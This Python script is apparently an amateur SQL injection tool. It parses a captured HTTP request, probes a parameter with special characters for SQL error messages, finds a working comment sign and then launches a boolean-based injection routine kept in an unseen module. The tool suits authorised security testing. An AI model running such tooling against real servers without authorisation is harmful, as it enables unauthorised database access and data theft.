import requests
import sys
import copy

from DB import DB
from Table import Table
from HTTPRequest import HTTPRequest
from Enums import HTTP_Types
from BooleanBasedInjection import *
from HandleRequests import *
from STRINGS import *


def parse_request_file(request_filepath):
    """
    parses a txt file of a request (copied from fiddler, for example) into a HTTPRequest Object
    :param request_filepath: the path to the txt file
    :return: a HTTPRequest object containing all the data
    """
    with open(request_filepath) as fp:
        lines = fp.read().splitlines()
    request = HTTPRequest()
    headers = True
    for i in range(0, len(lines)):
        if i == 0:
            request.set_method(HTTP_Types[lines[i].split(" ")[0]])
            request.set_url(lines[i].split(" ")[1])
        else:
            if lines[i] == '':
                headers = False
            elif headers:
                header_name = lines[i].split(HEADER_SEP)[0]
                request.set_header(header_name, lines[i].split(header_name + HEADER_SEP)[-1])
            else:  # assuming only parameters and no data
                for parameter in lines[i].split(AMPERSAND):
                    name = parameter.split(EQUAL_SIGN)[0]
                    value = parameter.split(name + EQUAL_SIGN)[1]
                    request.set_parameter(name, value)
    return request


def get_request_copy(request):
    """
    creates a deep copy of a HTTPRequest object and all of its attributes
    :param request: the object we want to copy
    :return: a copy of this object
    """
    new_request = copy.deepcopy(request)
    new_parameters = copy.deepcopy(request.get_parameters())
    new_headers = copy.deepcopy(request.get_headers())
    new_request.set_parameters(new_parameters)
    new_request.set_headers(new_headers)
    return new_request


def find_sqli(request, parameter):
    """
    checks if the parameter given is sqli vulnerable by sending multiple requests to the server with different special
    characters and checking whether the response contains an error message
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter we want to check
    :return: the character causing the error, or NOT_DETECTED string if no error was caused
    """
    for char in SQLI_CHARS:
        response = send_sql_request(request, parameter, char)
        for error_msg in SQL_ERRORS:
            if error_msg in response.text.lower():
                print(SQLI_DETECTED_MSG)
                return char
    print(SQLI_NOT_DETECTED_MSG)
    return NOT_DETECTED

def find_comment_sign(request, parameter):
    """
    checks which char is valid as a comment starter
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter which is exploitable
    :return: the character marking a comment, or NOT_DETECTED string if no error was caused
    """
    for sign in SQL_COMMENTS:
        response = send_sql_request(request, parameter, APOSTROPHE + sign)
        for error_msg in SQL_ERRORS:
            if error_msg not in response.text.lower():
                return sign
    print(SQLI_NO_COMMENT_SIGN_DETECTED)
    return NOT_DETECTED




if __name__ == '__main__':
    origin_request = parse_request_file("C:\\Users\\Amit\\Downloads\\request.txt")
    parameter = "username"
    request = get_request_copy(origin_request)
    is_there_sqli = find_sqli(request, parameter)
    if is_there_sqli == NOT_DETECTED:
        exit(0)
    comment = find_comment_sign(request, parameter)
    if comment == NOT_DETECTED:
        exit(0)
    boolean_based_injection(request, parameter, comment)

